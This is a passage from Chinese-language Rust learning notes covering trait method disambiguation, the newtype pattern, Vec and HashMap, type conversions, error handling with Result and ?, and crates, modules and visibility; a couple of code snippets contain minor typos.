trait B { fn func ( & self ); } struct C ; impl A for C { fn func ( & self ) { println! ( \"A\" ); } } impl B for C { fn func ( & self ) { println! ( \"B\" ); } } impl C { fn func ( & self ) { println! ( \"C\" ); } } fn main () { let c = C ; c . func (); // C A :: func ( & c ); // A B :: func ( & c ); // B C :: func ( & c ); // C \u4e0e\u7b2c\u4e00\u4e2a\u76f8\u540c\uff0c\u4f46\u663e\u5f0f\u8c03\u7528 } \u8fd9\u6837\u8c03\u7528\u7684\u4e00\u4e2a\u6761\u4ef6\u662f\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f self\uff08\u53c8\u53eb\u65b9\u6cd5\u63a5\u6536\u5668 receiver\uff09\uff0c\u4f46\u5982\u679c\u662f\u5173\u8054\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a receiver\uff0crust \u4e5f\u5c31\u81ea\u7136\u4e0d\u77e5\u9053\u662f\u8c03\u7528\u54ea\u4e2a\u7c7b\u578b\u5b9e\u73b0\u7684\u7279\u5f81\u4e0a\u7684\u65b9\u6cd5 \u8fd9\u65f6\u9700\u8981\u4f7f\u7528\u5b8c\u5168\u9650\u5b9a\u8bed\u6cd5\uff1a < Type as Trait > :: function ( receiver_if_method , next_arg , .. .); \u4f8b\u5982\uff1a trait A { fn func (); } struct B ; impl A for B { fn func () { println! ( \"A\" ); } } impl B { fn func () { println! ( \"B\" ); } } fn main () { B :: func (); // B // A::func(); // \u62a5\u9519 < B as A > :: func (); // A } trait \u5b9a\u4e49\u4e2d\u7684 trait \u7ea6\u675f \u00b6 \u5982\u679c\u5728\u5b9a\u4e49\u7279\u5f81 A \u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u7279\u5f81 B \u7684\u65b9\u6cd5\uff0c\u5219 A \u548c B \u90fd\u8981\u5b9e\u73b0\uff08\u5b9e\u73b0\u4e86\u5c31\u597d\uff0c\u5148\u540e\u65e0\u6240\u8c13\uff09\u3002\u5728\u5b9a\u4e49 A \u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u5728\u540e\u9762\u52a0\u4e0a\u7ea6\u675f B\uff1a trait A : B { .. . } \u7ed5\u8fc7\u5b64\u513f\u89c4\u5219 \u00b6 \u7ed5\u8fc7\u5b64\u513f\u89c4\u5219\uff0c\u4e5f\u5c31\u662f\u5728\u5916\u90e8\u7c7b\u578b\u4e0a\u5b9e\u73b0\u5916\u90e8\u7279\u5f81\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 newtype \u6a21\u5f0f\uff0c\u5373\u521b\u5efa\u4e00\u4e2a\u5143\u7956\u7ed3\u6784\u4f53\u6765\u5305\u88c5\u5916\u90e8\u7c7b\u578b\uff0c\u8fd9\u6837\u5c31\u6784\u9020\u4e86\u4e00\u4e2a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u5185\u7684\u65b0\u7c7b\u578b \u6bd4\u5982\u60f3\u8981\u4e3a Vec < String > \u5b9e\u73b0 Display trait\uff0c\u4e8c\u8005\u90fd\u5728\u6807\u51c6\u5e93\u4e2d\uff0c\u65e0\u6cd5\u76f4\u63a5\u5b9e\u73b0\u3002\u4f7f\u7528 newtype \u6a21\u5f0f\uff1a use std :: fmt ; struct Wrapper ( Vec < String > ); impl fmt :: Display for Wrapper { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"[{}]\" , self . 0. join ( \", \" )) } } fn main () { let w = Wrapper ( vec! [ String :: from ( \"abc\" ), String :: from ( \"def\" )]); println! ( \"w = {}\" , w ); } \u96c6\u5408\u7c7b\u578b \u00b6 Vector \u00b6 \u52a8\u6001\u6570\u7ec4\uff0c\u7c7b\u578b Vec<T> \u521b\u5efa \u4f7f\u7528 Vec::new() \u521b\u5efa \u5982\u679c\u9884\u5148\u77e5\u9053\u5bb9\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 Vec::with_capacity(cap) \u521b\u5efa\uff0c\u4f1a\u63d0\u5347\u6027\u80fd \u4f7f\u7528 vec! \u5b8f\u6765\u521b\u5efa\uff0c\u540c\u65f6\u7ed9\u4e88\u521d\u503c let v = vec! [ 1 , 2 , 3 ]; // \u81ea\u52a8\u63a8\u65ad\u7c7b\u578b \u4f7f\u7528 Vec::from(...) \u6765\u4ece\u6570\u7ec4\u521b\u5efa Vector \u7c7b\u578b\u5728\u79fb\u51fa\u4f5c\u7528\u57df\u540e\u4f1a\u81ea\u52a8\u5220\u9664\uff0c\u5176\u5b58\u50a8\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u5220\u9664 \u64cd\u4f5c .push(...) \u5728\u672b\u5c3e\u6dfb\u52a0\u5143\u7d20 .pop() \u5254\u9664\u672b\u5c3e\u5143\u7d20 .extend(...) \u6269\u5c55 .len() \u83b7\u53d6\u957f\u5ea6 \u53ef\u4ee5\u4f7f\u7528\u5207\u7247\u6765\u501f\u7528\u5143\u7d20\uff08\u8d8a\u754c\u4f1a panic\uff09 .get(index) \u6765\u6839\u636e\u7d22\u5f15\u8bbf\u95ee\u5143\u7d20\uff0c\u8fd4\u56de\u7c7b\u578b\u662f Option<&T>\uff08\u8d8a\u754c\u8fd4\u56de None\uff09 for i in & v \u904d\u5386 \u5229\u7528 enum \u6216\u7279\u5f81\u5bf9\u8c61\u6765\u5b58\u50a8\u4e0d\u540c\u7c7b\u578b\u7684 HashMap \u00b6 \u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u7c7b\u578b HashMap<K, V> \u9700\u8981\u4f7f\u7528 std::collections::HashMap \u5f15\u5165 key \u4e00\u5b9a\u8981\u5b9e\u73b0 Hash \u548c Eq trait f32 \u548c f64 \u4e0d\u53ef\u4ee5 \u521b\u5efa HashMap::new() HashMap::with_capacity(cap) \u4f7f\u7528\u8fed\u4ee3\u5668\u548c collect let lst = vec! [( key1 , value1 ), ( key2 , value2 ), .. .]; let map : HashMap < _ , _ > = lst . into_iter (). collect (); \u64cd\u4f5c .insert(key, value) \u63d2\u5165\u4e00\u4e2a\u952e\u503c\u5bf9 .get(key) \u83b7\u53d6\u503c\uff0c\u8fd4\u56de Option<V> \u7c7b\u578b \u76f4\u63a5\u4f7f\u7528 [key] \u83b7\u53d6\u503c\uff0c\u6ca1\u6709 key \u4f1a panic .entry(key).or_insert(value) \u5982\u679c\u5b58\u5728 key\uff0c\u5219\u8fd4\u56de key \u5bf9\u5e94\u7684\u503c \u5982\u679c\u4e0d\u5b58\u5728 key\uff0c\u5219\u63d2\u5165 key-value \u952e\u503c\u5bf9 \u8fd4\u56de\u4e00\u4e2a &mut V \u5f15\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 map \u4e2d\u5185\u5bb9 .contains_key(key) \u67e5\u8be2\u662f\u5426\u5b58\u5728 key \u7c7b\u578b\u8f6c\u6362 \u00b6 \u4e00\u822c\u60c5\u51b5\u4e0b\uff08\u65b9\u6cd5\u8c03\u7528\u9664\u5916\uff09Rust \u4e0d\u4f1a\u8fdb\u884c\u9690\u5f0f\u7684\u7c7b\u578b\u8f6c\u6362 \u4f7f\u7528 as type \u8fdb\u884c\u663e\u5f0f\u7684\u8f6c\u6362 \u8d85\u8fc7\u6700\u5927\u503c\u4f1a\u6ea2\u51fa\uff0c\u5982 300_i32 as i8 \u4f1a\u5f97\u5230 44\uff0c\u800c\u4e0d\u4f1a panic \u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u6307\u9488 let mut values : [ i32 ; 2 ] = [ 1 , 2 ]; let p1 : * mut i32 = values . as_mut_ptr (); let first_address = p1 as usize ; // \u5c06 p1 \u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u4e00\u4e2a\u6574\u6570 let second_address = first_address + 4 ; let p2 = second_address as * mut i32 ; // \u8bbf\u95ee\u8be5\u5730\u5740\u6307\u5411\u7684\u4e0b\u4e00\u4e2a\u6574\u6570 p2 unsafe { * p2 += 1 ; } assert_eq! ( values [ 1 ], 3 ); TryInto \u8f6c\u6362 use std::convert::TryInto\uff0c\u4f46\u4e0d\u5fc5\u8981\uff0c\u5728 prelude \u4e2d TryInto trait \u6709 .try_into \u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a Result\uff0c\u4f7f\u7528 .unwrap() \u63d0\u53d6 let a : u16 = 1500 ; let b : u8 = b . try_into (). unwrap (); \u5927\u7c7b\u578b\u8f6c\u6362\u4e3a\u5c0f\u7c7b\u578b\u4f1a\u8fd4\u56de Err(e) \u65b9\u6cd5\u8c03\u7528\u65f6\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362 \u00b6 \u4f8b\u5982\u5728\u8c03\u7528 a.func() \u65f6\uff08a \u7684\u7c7b\u578b\u4e3a T\uff09\uff0c\u7f16\u8bd1\u5668\u4f1a\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c \u5c1d\u8bd5\u503c\u65b9\u6cd5\u8c03\u7528\uff0c\u5373 T::func(a) \u5982\u679c\u4e0a\u4e00\u6b65\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u5c1d\u8bd5\u5f15\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u5373 <&T>::func(a) <&mut T>::func(a) \u5982\u679c\u4e0a\u4e00\u6b65\u4ecd\u7136\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u8bd5\u7740\u89e3\u5f15\u7528 T\uff0c\u5982\u679c T \u6ee1\u8db3 Deref<Target = U>\uff0c\u5373 T \u53ef\u4ee5\u88ab\u89e3\u5f15\u7528\u4e3a U\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u4f7f\u7528 U \u7c7b\u578b\u5c1d\u8bd5\u8c03\u7528\uff08\u4ece 1 \u5f00\u59cb\u540c\u6837\u7684\u6b65\u9aa4\uff09\uff0c\u79f0\u4e3a\u89e3\u5f15\u7528\u65b9\u6cd5\u8c03\u7528 \u5982\u679c T \u4e0d\u80fd\u88ab\u89e3\u5f15\u7528\uff0c\u4e14 T \u662f\u4e00\u4e2a\u5b9a\u957f\u7c7b\u578b\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u5c1d\u8bd5\u5c06 T \u8f6c\u4e3a\u4e0d\u5b9a\u957f\u7c7b\u578b\uff08\u4f8b\u5982 [i32; 2] \u8f6c\u4e3a [i32]\uff09 \u5982\u679c\u4e0a\u9762\u90fd\u4e0d\u884c\uff0c\u5219\u4e0d\u80fd\u901a\u8fc7\u7f16\u8bd1 \u4f8b 1 let array : Rc < Box < [ T ; 3 ] >> = .. .; let a = array [ 0 ]; // \u53ef\u4ee5\u83b7\u53d6\u7b2c\u4e00\u4e2a\u5143\u7d20 \u4f1a\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a array[0] \u5b9e\u9645\u4e0a\u8868\u793a array.index(0)\uff08Index trait\uff09 \u68c0\u67e5 array \u662f\u5426\u5b9e\u73b0 Index \u7279\u5f81\uff0cRc<Box<[T; 3]>> \u6ca1\u6709\u5b9e\u73b0\uff0c\u5c1d\u8bd5\u4e0d\u53ef\u53d8\u5f15\u7528\u548c\u53ef\u53d8\u5f15\u7528\uff0c\u90fd\u6ca1\u6709\u5b9e\u73b0\uff0c\u65e0\u6cd5\u8c03\u7528 \u5c1d\u8bd5\u89e3\u5f15\u7528 array\uff0c\u53d8\u4e3a Box<[T; 3]> \u7c7b\u578b\uff0c\u5bf9\u5176\u8c03\u7528 .index(0) Box<[T; 3]>\u3001&Box<[T; 3]>\u3001&mut Box<[T; 3]> \u90fd\u6ca1\u6709\u5b9e\u73b0 Index\uff0c\u65e0\u6cd5\u8c03\u7528 \u89e3\u5f15\u7528 Box<[T; 3]>\uff0c\u5f97\u5230 [T; 3] [T; 3] \u4e5f\u6ca1\u6709\u5b9e\u73b0 Index\uff08\u53ea\u6709\u6570\u7ec4\u5207\u7247\u624d\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u8bbf\u95ee\uff09\uff0c\u5f15\u7528\u3001\u89e3\u5f15\u7528\u90fd\u4e0d\u884c \u5c06\u5b9a\u957f [T; 3] \u8f6c\u4e3a\u4e0d\u5b9a\u957f [T]\uff0c\u4e5f\u5c31\u662f\u6570\u7ec4\u5207\u7247\uff0c\u5b83\u5b9e\u73b0\u4e86 Index\uff0c\u53ef\u4ee5\u8c03\u7528 .index(0) \u65b9\u6cd5 \u4f8b 2 \u5df2\u77e5 clone \u65b9\u6cd5\u7684\u7b7e\u540d\u662f fn clone ( & T ) -> T ; fn func < T : Clone > ( value : & T ) { let cloned = value . clone (); } \u4e0a\u8ff0\u4ee3\u7801\u4e2d\u56e0\u4e3a value \u672c\u8eab\u662f &T \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 clone \u65b9\u6cd5\u5f97\u5230\u4e00\u4e2a T \u7c7b\u578b\u7684 cloned fn func < T > ( value : & T ) { let cloned = value . clone (); } \u4e0a\u8ff0\u4ee3\u7801\u867d\u7136\u6ca1\u6709\u4e3a T \u9650\u5236 Clone \u7279\u5f81\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u3002\u8fd9\u65f6\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528 value.clone()\uff0c\u6240\u4ee5\u4f1a\u5c1d\u8bd5\u8fdb\u884c\u5f15\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u6b64\u65f6 T \u53d8\u4e3a &T\uff0c&T \u5b9e\u73b0\u4e86 Clone \u7279\u5f81\uff0c\u6240\u4ee5\u53ef\u4ee5\u8c03\u7528\uff0c\u4f46\u8fd9\u65f6 clone \u7684\u7b7e\u540d\u76f8\u5f53\u4e8e fn clone ( && T ) -> & T \uff0c\u6240\u4ee5\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c cloned \u7684\u7c7b\u578b\u4e3a &T \u8fd4\u56de\u503c\u4e0e\u9519\u8bef\u5904\u7406 \u00b6 Rust \u8ba4\u4e3a\u7684\u4e24\u79cd\u9519\u8bef\uff1a \u53ef\u6062\u590d\u9519\u8bef\uff0c\u53ea\u5f71\u54cd\u7528\u6237\u81ea\u8eab\u7684\u64cd\u4f5c\uff0c\u4e0d\u4f1a\u5bf9\u7cfb\u7edf\u4ea7\u751f\u5f71\u54cd \u4e0d\u53ef\u6062\u590d\u9519\u8bef\uff0c\u5168\u5c40\u6027\u6216\u8005\u7cfb\u7edf\u6027\u7684\u9519\u8bef\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u5f71\u54cd\u5f88\u5927 Rust \u63a8\u8350\u53ef\u6062\u590d\u9519\u8bef\u4f7f\u7528 Result<T, E> \u8fd4\u56de\u503c\u7b49\u5f85\u540e\u7eed\u5904\u7406\u5f02\u5e38\uff0c\u4e0d\u53ef\u6062\u590d\u9519\u8bef\u76f4\u63a5 panic \u7ec8\u7aef\u7a0b\u5e8f panic \u00b6 \u53ef\u4ee5\u901a\u8fc7 panic! \u5b8f\u6765\u76f4\u63a5\u629b\u51fa\u4e00\u4e2a panic \u8fd0\u884c\u65f6\u5e26\u6709 RUST_BACKTRACE=1 \u73af\u5883\u53d8\u91cf\u7684\u8bdd\uff0c\u4f1a\u663e\u793a\u56de\u6eaf\u6808\uff08\u9700\u8981\u5f00\u542f debug \u6807\u5fd7\uff09 panic \u65f6\u6709\u4e24\u79cd\u65b9\u5f0f\u6765\u7ec8\u6b62\uff1a \u6808\u5c55\u5f00\uff1a\u56de\u6eaf\u6808\u4e0a\u6570\u636e\u548c\u51fd\u6570\u8c03\u7528\uff0c\u53ef\u4ee5\u63d0\u4f9b\u5145\u5206\u62a5\u9519\u4fe1\u606f\u548c\u6808\u8c03\u7528\u4fe1\u606f \u76f4\u63a5\u7ec8\u6b62\uff1a\u4e0d\u6e05\u7406\u6570\u636e\uff0c\u76f4\u63a5\u9000\u51fa\u7a0b\u5e8f\uff0c\u4ea4\u7ed9\u7cfb\u7edf\u6765\u6e05\u7406 \u9ed8\u8ba4\u60c5\u51b5\u662f\u6808\u5c55\u5f00 \u76f4\u63a5\u7ec8\u6b62\u7f16\u8bd1\u51fa\u7684\u53ef\u6267\u884c\u6587\u4ef6\u66f4\u5c0f\uff0c\u53ef\u4ee5\u5728 release \u65f6\u6307\u5b9a\u4f7f\u7528\u76f4\u63a5\u7ec8\u6b62\uff1a [profile.release] panic = 'abort' \u5982\u679c\u662f main \u7ebf\u7a0b panic \u4e86\uff0c\u5219\u7a0b\u5e8f\u7ec8\u6b62\u3002\u5982\u679c\u5b50\u7ebf\u7a0b panic \u4e86\uff0c\u5219\u7ebf\u7a0b\u7ec8\u6b62\uff0cmain \u7ebf\u7a0b\u4ecd\u7136\u8fd0\u884c\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u7ed3\u675f Result \u00b6 Result \u662f\u4e00\u4e2a\u679a\u4e3e\u7c7b\u578b\uff0c\u5b9a\u4e49\u4e3a\uff1a enum Result < T , E > { Ok ( T ), Err ( E ), } \u4f7f\u7528 match \u6765\u5904\u7406 Result \u7c7b\u578b \u4f8b\u5982 IO \u9519\u8bef\uff0c\u53ef\u4ee5\u5bf9\u4e8e Err(error) \u518d\u5339\u914d error.kind()\uff0c\u5176\u53ef\u80fd\u7684\u503c\u5728 std::io::ErrorKind \u4e2d \u53ef\u4ee5\u914d\u5408 panic\uff0c\u5c06 error \u7528 debug \u6a21\u5f0f\uff08{:?}\uff09\u8fdb\u884c\u8f93\u51fa \u5bf9\u4e8e Result\uff0c\u5982\u679c\u5931\u8d25\u5c31 panic \u4f7f\u7528 .unwrap()\uff1a\u5982\u679c\u662f Err \u5219\u4f1a panic\uff0c\u5e76\u8f93\u51fa\u9519\u8bef\u5185\u5bb9 \u4f7f\u7528 .expect(\"...\")\uff1a\u540c\u6837 panic\uff0c\u4f46\u4f1a\u663e\u793a\u4e3a panicked at '...: Err \u5185\u5bb9 ' ? \u4f20\u64ad\u9519\u8bef \u5728\u51fd\u6570\u4e2d\u5224\u65ad Result\uff0c\u5e76\u4f20\u9012\u8fd4\u56de Err \u53ef\u4ee5\u5199\u4e3a fn func () -> Result < String , io :: Error > { let f = File :: open ( \"test.txt\" ); let mut f = match f { Ok ( file ) => file , Err ( e ) => return Err ( e ), }; let mut s = String :: new (); match f . read_to_string ( & mut s ) { Ok ( _ ) => Ok ( s ), Err ( e ) => Err ( e ), } } \u5176\u4e2d match-return Err \u90e8\u5206\u53ef\u4ee5\u5229\u7528 ? \u6765\u7b80\u5199\uff1a let mut f = File . open ( \"test.txt\" ) ? ; ? \u5728\u8fd4\u56de Err \u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8f6c\u6362\u9519\u8bef\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a fn func () -> Result < File , Box < dyn std :: error :: Error >> { let mut f = File :: open ( \"test.txt\" ) ? ; Ok ( f ) } \u5728 ? \u5904\u7406\u8fd4\u56de\u9519\u8bef\u7684\u65f6\u5019\uff0c\u5f97\u5230\u7684\u662f std::io::Error \u7c7b\u578b\uff0c? \u53ef\u4ee5\u81ea\u52a8\u8c03\u7528 From trait \u7684 from \u65b9\u6cd5\uff0c\u5c06 std::io::Error \u8f6c\u4e3a\u9700\u8981\u7684 Box<dyn std::error::Error> ? \u53ef\u4ee5\u8fdb\u884c\u94fe\u5f0f\u8c03\u7528\uff1a fn func () -> Result < String , std :: io :: Error > { let mut s = String :: new (); File :: open ( \"test.txt\" ) ? . read_to_string ( & mut s ) ? ; Ok ( s ) } \u5bf9\u4e8e\u8fd9\u4e2a\u64cd\u4f5c\uff0cRust \u6807\u51c6\u5e93\u63d0\u4f9b\u4e86 std::fs::read_to_string(filename) \u51fd\u6570\uff0c\u800c\u4e14\u8fd4\u56de\u7684\u5c31\u662f Result<String, std::io::Error> ? \u7ed3\u5408 Option \u548c Result \u540c\u7406\uff0c? \u4e5f\u9002\u7528\u4e8e Option \u7684\u8fd4\u56de\uff0c\u4e5f\u5c31\u662f\u5f97\u5230 None \u5c31\u7acb\u5373\u8fd4\u56de None\uff0c\u5426\u5219\u5c55\u5f00\u51fa Some \u4e2d\u7684\u503c main \u51fd\u6570\u8fd4\u56de\u503c main \u51fd\u6570\u53ef\u4ee5\u6709\u8fd4\u56de\u503c\u7c7b\u578b Result<(), Box<dyn std::error::Error>> \u53ea\u6709\u58f0\u660e\u4e86\u8fd9\u79cd\u8fd4\u56de\u503c\u7684 main \u51fd\u6570\u4e2d\u624d\u53ef\u4ee5\u4f7f\u7528 ? \u6765\u63d0\u524d\u63a2\u6d4b\u9519\u8bef\u7ec8\u6b62 main \u51fd\u6570\uff1a use std :: error :: Error ; use std :: fs :: File ; fn main () -> Result < (), Box < dyn Error >> { let f = File :: open ( \"test.txt\" ) ? ; Ok (()) } try! \u5b8f ? \u7684\u65e9\u671f\u7248\u672c\uff0c\u907f\u514d\u4f7f\u7528 \u5b9a\u4e49\uff1a macro_rules! try { ( $e : expr ) => ( match $e { Ok ( val ) => val , Err ( err ) => return Err ( :: std :: convert :: From :: from ( err )), }); } \u4f7f\u7528\u65b9\u6cd5\uff0c\u4ee5\u4e0b\u4e24\u884c\u7b49\u4ef7\uff1a let x = func () ? ; let x = try ! ( func ()); \u5305\u548c\u6a21\u5757 \u00b6 crate \u4e0e package \u00b6 crate \u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u53ef\u7f16\u8bd1\u5355\u5143\uff0c\u53ef\u4ee5\u7f16\u8bd1\u51fa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u4e00\u4e2a\u5e93 package \u662f cargo \u521b\u5efa\u7684\u5305\u542b Cargo.toml \u7684\u201c\u9879\u76ee\u201d\uff0c\u53ef\u4ee5\u5305\u542b\u56e0\u4e3a\u529f\u80fd\u6027\u88ab\u7ec4\u7ec7\u5728\u4e00\u8d77\u7684\u4e00\u4e2a crate \u6216\u591a\u4e2a crate \u4e00\u4e2a package \u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u5e93\uff08library\uff09\u7c7b\u578b\u7684 crate\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u4e8c\u8fdb\u5236\u7c7b\u578b\u7684 crate cargo new \u9ed8\u8ba4\u521b\u5efa\u7684\u5c31\u662f\u4e8c\u8fdb\u5236 package src/main.rs \u662f\u4e8c\u8fdb\u5236 crate \u7684\u6839\u6587\u4ef6\uff0c\u5176\u5305\u540d\u548c\u6240\u5c5e package \u76f8\u540c\uff0c\u5165\u53e3\u70b9\u5728 main \u51fd\u6570 cargo new < name > --lib \u521b\u5efa\u5e93 package \u5e93 package \u53ea\u80fd\u4f5c\u4e3a\u7b2c\u4e09\u65b9\u5e93\u88ab\u5f15\u7528\uff0c\u4e0d\u80fd\u4f7f\u7528 cargo run \u8fd0\u884c src/lib.rs \u662f\u5e93\u7c7b\u578b\u540c\u540d crate \u7684\u6839\u6587\u4ef6 \u5178\u578b package \u7ed3\u6784 \u00b6 . \u251c\u2500\u2500 Cargo.toml \u251c\u2500\u2500 Cargo.lock \u251c\u2500\u2500 src \u2502 \u251c\u2500\u2500 main.rs // \u9ed8\u8ba4\u4e8c\u8fdb\u5236 crate\uff08\u7f16\u8bd1\u751f\u6210 package \u540c\u540d\u53ef\u6267\u884c\u6587\u4ef6\uff09 \u2502 \u251c\u2500\u2500 lib.rs // \u552f\u4e00\u5e93 crate \u2502 \u2514\u2500\u2500 bin // \u5176\u4f59\u4e8c\u8fdb\u5236 crate\uff08\u5206\u522b\u751f\u6210\u6587\u4ef6\u540d\u540c\u540d\u53ef\u6267\u884c\u6587\u4ef6\uff09 \u2502 \u2514\u2500\u2500 main1.rs \u2502 \u2514\u2500\u2500 main2.rs \u251c\u2500\u2500 tests // \u96c6\u6210\u6d4b\u8bd5 \u2502 \u2514\u2500\u2500 some_integration_tests.rs \u251c\u2500\u2500 benches // \u57fa\u51c6\u6027\u80fd\u6d4b\u8bd5 benchmark \u6587\u4ef6 \u2502 \u2514\u2500\u2500 simple_bench.rs \u2514\u2500\u2500 examples // \u793a\u4f8b \u2514\u2500\u2500 simple_example.rs \u6a21\u5757 Module \u00b6 \u5728 lib.rs \u4e2d\u4f7f\u7528 mod \u5173\u952e\u5b57\u521b\u5efa\u6a21\u5757\uff0c\u540e\u63a5\u6a21\u5757\u540d mod \u53ef\u4ee5\u5d4c\u5957\uff0c\u6a21\u5757\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u5404\u79cd rust \u7c7b\u578b src/main.rs \u548c src/lib.rs \u79f0\u4e3a crate root \u6a21\u5757\u4f7f\u7528 :: \u9010\u7ea7\u8bbf\u95ee crate \u6307\u6839\uff0c\u4f7f\u7528 crate \u4e5f\u5c31\u76f8\u5f53\u4e8e\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84 super \u6307\u7236\u6a21\u5757\uff08\u4e0a\u4e00\u7ea7\uff09\uff0c\u76f8\u5f53\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684 .. self \u6307\u81ea\u8eab\u6a21\u5757 \u5982\u4e0b lib.rs\uff1a mod A { mod B { fn func_a () { self :: func_b (); } fn func_b () { super :: C :: func_c (); } } mod C { fn func_c () {} } } pub fn func () { crate :: A :: B :: func_a (); // \u7edd\u5bf9\u8def\u5f84\u5f15\u7528 A :: B :: func_b (); // \u76f8\u5bf9\u8def\u5f84\u5f15\u7528 self :: A :: C :: func_c (); } \u5b83\u7684\u6a21\u5757\u6811\u4e3a\uff1a crate \u251c\u2500\u2500 func \u2514\u2500\u2500 A \u251c\u2500\u2500 B \u2502 \u251c\u2500\u2500 func_a \u2502 \u2514\u2500\u2500 func_b \u2514\u2500\u2500 C \u2514\u2500\u2500 func_c \u4ec5\u4f7f\u7528 mod name ; \u5c06\u521b\u5efa\u4e00\u4e2a\u6a21\u5757\uff0c\u5e76\u4ece\u540c\u76ee\u5f55\u4e0b\u540c\u540d\u7684 name .rs \u4e2d\u52a0\u8f7d\u6a21\u5757\u5185\u5bb9 \u4ee3\u7801\u53ef\u89c1\u6027 \u00b6 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709\u7c7b\u578b\uff08\u51fd\u6570\u3001\u65b9\u6cd5\u3001\u7ed3\u6784\u4f53\u3001\u679a\u4e3e\u2026\u2026\uff09\u90fd\u662f\u79c1\u6709\u7684 \u7236\u6a21\u5757\u65e0\u6cd5\u8bbf\u95ee\u5b50\u6a21\u5757\u4e2d\u7684\u79c1\u6709\u9879\uff0c\u800c\u5b50\u6a21\u5757\u53ef\u4ee5\u8bbf\u95ee\u7236\u6a21\u5757\u53ca\u66f4\u4e0a\u5c42\u7684\u6a21\u5757\u7684\u79c1\u6709\u9879 \u4f7f\u7528 pub \u5173\u952e\u5b57\u5c06\u6a21\u5757\u3001\u51fd\u6570\u7b49\u6807\u4e3a\u5bf9\u5916\u53ef\u89c1\u7684 \u7ed3\u6784\u4f53\u4e0e\u679a\u4e3e\u7684\u53ef\u89c1\u6027 \u4ec5\u5c06\u7ed3\u6784\u4f53\u8bbe\u7f6e\u4e3a pub\uff0c\u5176\u5185\u90e8\u6240\u6709\u5b57\u6bb5\u4ecd\u7136\u662f\u79c1\u6709\u7684 \u4ec5\u5c06\u679a\u4e3e\u8bbe\u7f6e\u4e3a pub\uff0c\u5219\u5176\u5185\u90e8\u6240\u6709\u5b57\u6bb5\u90fd\u5bf9\u5916\u53ef\u89c1 use \u5f15\u5165 \u00b6 \u4f7f\u7528 use \u5173\u952e\u5b57\u6765\u5f15\u5165\u6a21\u5757\u6216\u7c7b\u578b\uff0c\u6765\u7b80\u5316\u8c03\u7528 \u8981\u907f\u514d\u540c\u540d\u8c03\u7528 \u4f7f\u7528 as \u6765\u8bbe\u7f6e\u522b\u540d\u89e3\u51b3\u51b2\u7a81\u95ee\u9898\uff0c\u4f8b\u5982\uff1a use std :: fmt :: Result ; use std :: io :: Result as IoResult ; \u5229\u7528 use \u5bfc\u51fa\uff0c\u5982\uff1a mod A { pub mod B { pub fn func_b () {} } } pub use crate :: A :: B ; pub fn func () { B :: func_b (); } \u4ece\u5916\u90e8\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 B \u6a21\u5757 \u53ef\u4ee5\u4f7f\u7528 {} \u6765\u7b80\u5316 use std :: collections :: { HashMap , BTreeMap , HashSet }; use std :: { cmp :: Ordering , io }; {} \u4e2d\u53ef\u4ee5\u4f7f\u7528 self\uff1a use std :: io :: { self , Write } // \u5373 use std::io \u4ee5\u53ca use std::io::Write \u4f7f\u7528 * \u5f15\u5165\u6a21\u5757\u4e0b\u6240\u6709\u516c\u5f00\u9879\uff0c\u5982 use std :: collections :: * ; \uff0c\u4f46\u8981\u5c0f\u5fc3\u540d\u79f0\u51b2\u7a81 \u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 \u00b6 \u4f8b\u5982\u4f7f\u7528 rand \u5305\uff1a \u4fee\u6539 Cargo.toml\uff0c\u5728 [dependencies] \u4e2d\u6dfb\u52a0 rand = \"0.8.3\" \u5728\u4ee3\u7801\u4e2d\u4f7f\u7528 rand::... \u5373\u53ef use rand :: Rng ; // trait fn main () { let n = rand :: thread_rng (). gen_range ( 1 .. 101 ); } \u53ef\u4ee5\u5728 crates.io \u6216 lib.rs \u4e2d\u68c0\u7d22\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 \u53d7\u9650\u53ef\u89c1\u6027 \u00b6 pub \u8868\u793a\u65e0\u4efb\u4f55\u9650\u5236\u7684\u5b8c\u5168\u53ef\u89c1 pub ( crate ) 